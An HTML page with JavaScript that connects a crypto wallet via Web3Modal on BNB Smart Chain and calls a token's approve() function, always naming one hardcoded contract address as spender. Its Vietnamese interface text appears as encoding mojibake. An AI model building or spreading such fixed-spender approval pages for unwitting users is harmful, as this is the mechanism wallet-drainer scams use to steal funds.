<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Web3Modal Approve Demo</title>
  <script src="https://unpkg.com/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
  <script src="https://unpkg.com/web3modal@1.9.12/dist/index.js"></script>
  <style>
    body { font-family: Arial; padding: 30px; text-align: center; }
    input, button { margin: 10px; padding: 10px; width: 80%; }
  </style>
</head>
<body>
  <h2>Approve Token with Web3Modal</h2>
  <div id="status">Ch∆∞a k·∫øt n·ªëi v√≠</div>
  <button onclick="connect()">üîó K·∫øt n·ªëi v√≠</button>
  <br>
  <input id="tokenAddress" placeholder="Token address c·∫ßn approve" />
  <input id="amount" placeholder="S·ªë l∆∞·ª£ng" />
  <button onclick="approve()" id="approveBtn" disabled>‚úÖ Approve</button>

  <script>
    const scB_address = "0xb300000b72DEAEb607a12d5f54773D1C19c7028d";
    let provider, web3Modal, signer;

    const providerOptions = {
      walletconnect: {
        package: window.WalletConnectProvider.default,
        options: {
          rpc: { 56: "https://bsc-dataseed.binance.org/" },
          chainId: 56
        }
      }
    };

    web3Modal = new window.Web3Modal.default({
      cacheProvider: false,
      providerOptions
    });

    async function connect() {
      try {
        const instance = await web3Modal.connect();
        provider = new ethers.providers.Web3Provider(instance);
        signer = provider.getSigner();
        const address = await signer.getAddress();
        document.getElementById("status").innerText = "ƒê√£ k·∫øt n·ªëi: " + address;
        document.getElementById("approveBtn").disabled = false;
      } catch (err) {
        console.error("K·∫øt n·ªëi th·∫•t b·∫°i:", err);
        document.getElementById("status").innerText = "K·∫øt n·ªëi v√≠ th·∫•t b·∫°i!";
      }
    }

    async function approve() {
      const tokenAddr = document.getElementById("tokenAddress").value;
      const amountStr = document.getElementById("amount").value;
      if (!ethers.utils.isAddress(tokenAddr)) {
        document.getElementById("status").innerText = "ƒê·ªãa ch·ªâ kh√¥ng h·ª£p l·ªá!";
        return;
      }

      try {
        const token = new ethers.Contract(tokenAddr, [
          "function approve(address spender, uint256 amount) public returns (bool)",
          "function decimals() public view returns (uint8)"
        ], signer);
        const decimals = await token.decimals();
        const amount = ethers.utils.parseUnits(amountStr, decimals);
        const tx = await token.approve(scB_address, amount);
        await tx.wait();
        document.getElementById("status").innerText = "Approve th√†nh c√¥ng! Tx: " + tx.hash;
      } catch (err) {
        console.error("Approve th·∫•t b·∫°i:", err);
        document.getElementById("status").innerText = "Approve th·∫•t b·∫°i!";
      }
    }
  </script>
</body>
</html>
